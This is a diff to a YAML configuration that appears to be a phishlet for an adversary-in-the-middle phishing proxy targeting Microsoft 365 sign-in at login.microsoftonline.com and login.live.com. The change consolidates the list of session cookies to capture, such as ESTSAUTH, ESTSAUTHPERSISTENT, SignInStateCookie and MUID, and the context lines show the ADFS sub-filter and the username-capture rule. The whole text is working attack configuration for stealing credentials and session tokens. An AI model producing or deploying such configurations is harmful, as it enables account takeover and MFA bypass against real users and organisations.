@@ -20,22 +20,8 @@ sub_filters:
   # Uncomment and fill in if your target organization utilizes ADFS
   #- {triggers_on: '<insert-adfs-subdomain-and-host>', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
 auth_tokens:
-  - domain: ".login.microsoftonline.com"
-    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT","ESTSAUTHLIGHT", ".*,regexp"]
-  - domain: "login.microsoftonline.com"
-    keys: ["SignInStateCookie", ".*,regexp"]
-  - domain: "login.microsoftonline.com"
-    keys: ["stsservicecookie", ".*,regexp"]
-  - domain: "login.microsoftonline.com"
-    keys: ["buid", ".*,regexp"]
-  - domain: "login.microsoftonline.com"
-    keys: ["x-ms-gateway-slice", ".*,regexp"]
-  - domain: "login.microsoftonline.com"
-    keys: ["fpc", ".*,regexp"]
-  - domain: "login.live.com"
-    keys: ["MSPRequ",".*,regexp"]
-  - domain: "login.live.com"
-    keys: ["uaid",".*,regexp"]
+  - domain: '.login.microsoftonline.com'
+    keys: ['esctx','ESTSAUTHPERSISTENT', 'ESTSAUTH',  'SignInStateCookie','uaid','MSPRequ','stsservicecookie','buid','ESTSAUTHLIGHT','x-ms-gateway-slice','fpc','MUID']
 credentials:
   username:
     key: '(login|UserName)'
